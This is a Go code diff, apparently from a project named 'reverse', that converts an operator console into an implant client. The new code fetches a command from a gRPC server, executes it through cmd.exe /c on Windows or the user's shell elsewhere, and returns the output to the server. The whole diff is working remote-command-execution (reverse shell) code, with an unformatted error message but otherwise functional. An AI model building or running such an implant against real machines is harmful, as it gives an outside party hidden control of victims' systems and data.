@@ -1,11 +1,12 @@
 package main
 
 import (
-	"bufio"
 	"context"
 	"fmt"
 	"log"
 	"os"
+	"os/exec"
+	"runtime"
 	"strings"
 
 	pb "github.com/bartimus-primed/proto/reverse/reverse_pb"
@@ -30,45 +31,40 @@ func main() {
 	defer conn.Close()
 	c := pb.NewReverseInteractClient(conn)
 
-	stream, err := c.HandsOn(context.Background())
+	// stream, err := c.HandsOn(context.Background())
+	// if err != nil {
+	// 	panic(err.Error())
+	// }
+	command_receive, err := c.GetCommand(context.Background(), &pb.Response{
+		RanCommand: "",
+		Resp:       "",
+		Success:    false,
+		Ready:      true,
+	})
 	if err != nil {
-		panic(err.Error())
+		panic("Command Error...")
 	}
-	command_buff := bufio.NewReader(os.Stdin)
-	command_to_run := ""
-	go func() {
-		for {
-			resp, err := stream.Recv()
-			if err != nil || resp.Resp == "" {
-				fmt.Println("Command Error...")
-				recv = true
+	cmd := strings.Split(command_receive.GetCmd(), " ")
+	cleaned_cmd := strings.TrimSpace(command_receive.GetCmd())
+	if cleaned_cmd != "exit" {
+		var cmdstruct *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd_clean := []string{"cmd.exe", "/c"}
+			for _, a := range cmd {
+				cmd_clean = append(cmd_clean, a)
 			}
-			if resp.Resp != "" {
-				fmt.Println("\nReceived: ", resp.GetResp())
-				recv = true
-				if strings.TrimSpace(resp.GetResp()) == "exit" {
-					shouldExit = true
-				}
+			cmdstruct = &exec.Cmd{
+				Path: "cmd.exe",
+				Args: cmd_clean,
 			}
+		} else {
+			cmdstruct = exec.Command(os.Getenv("SHELL"), "-c", strings.Join(cmd, " "))
 		}
-	}()
-	for !shouldExit {
-		if recv {
-			fmt.Print("Enter command to run on implant: ")
-			recv = false
-			cmd_input, _ := command_buff.ReadString('\n')
-			command_to_run = strings.Replace(cmd_input, "\n", "", -1)
-			command_to_run = strings.TrimSpace(command_to_run)
-			if command_to_run == "exit" {
-				shouldExit = true
-			}
-			fmt.Println(fmt.Sprintln(command_to_run))
-			cmd := &pb.Command{
-				Cmd:      fmt.Sprintln(command_to_run),
-				Timeout:  5,
-				SendResp: true,
-			}
-			stream.Send(cmd)
+		fmt.Println(cmdstruct.Path, cmdstruct.Args)
+		out, err := cmdstruct.CombinedOutput()
+		if err != nil {
+			c.GetCommand(context.Background(), &pb.Response{Resp: fmt.Sprintf("Failed with: ", err), Success: false})
 		}
+		c.GetCommand(context.Background(), &pb.Response{Resp: string(out), RanCommand: command_receive.GetCmd(), Success: true})
 	}
 }
